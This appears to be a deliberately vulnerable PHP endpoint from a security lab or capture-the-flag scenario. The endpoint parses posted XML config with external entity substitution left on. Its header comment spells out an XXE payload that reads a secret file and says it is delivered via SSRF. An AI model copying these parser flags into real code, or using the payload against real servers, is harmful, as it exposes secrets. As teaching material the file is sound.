<?php
/**
 * NovaTech Internal Config API — /config-check.php
 *
 * Accepts an XML configuration blob and returns parsed key-value pairs.
 *
 * VULNERABILITY: XXE (XML External Entity Injection)
 * ────────────────────────────────────────────────────
 * PHP's DOMDocument::loadXML() is called with LIBXML_NOENT which
 * substitutes XML entities — including external file:// entities.
 *
 * Exploit payload:
 *
 *   <?xml version="1.0"?>
 *   <!DOCTYPE config [
 *     <!ENTITY xxe SYSTEM "file:///app/config/render_secret.txt">
 *   ]>
 *   <config>
 *     <item><key>secret</key><value>&xxe;</value></item>
 *   </config>
 *
 * The response will contain the contents of render_secret.txt.
 * Delivered via SSRF POST from the webhook tester.
 */

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'POST only', 'example' =>
        '<?xml version="1.0"?><config><item><key>env</key><value>prod</value></item></config>'
    ]);
    exit;
}

$xml = file_get_contents('php://input');
if (!$xml) {
    http_response_code(400);
    echo json_encode(['error' => 'No XML body provided.']);
    exit;
}

// ── VULNERABLE: LIBXML_NOENT enables external entity substitution ─────────
libxml_use_internal_errors(true);
$dom = new DOMDocument();
$loaded = $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

if (!$loaded) {
    $errs = array_map(fn($e) => trim($e->message), libxml_get_errors());
    libxml_clear_errors();
    http_response_code(400);
    echo json_encode(['error' => 'XML parse error', 'details' => $errs]);
    exit;
}

$parsed = [];
foreach ($dom->getElementsByTagName('item') as $item) {
    $key = $item->getElementsByTagName('key')->item(0)?->textContent   ?? '';
    $val = $item->getElementsByTagName('value')->item(0)?->textContent ?? '';
    $parsed[$key] = $val;
}

echo json_encode(['status' => 'ok', 'parsed' => $parsed], JSON_PRETTY_PRINT);
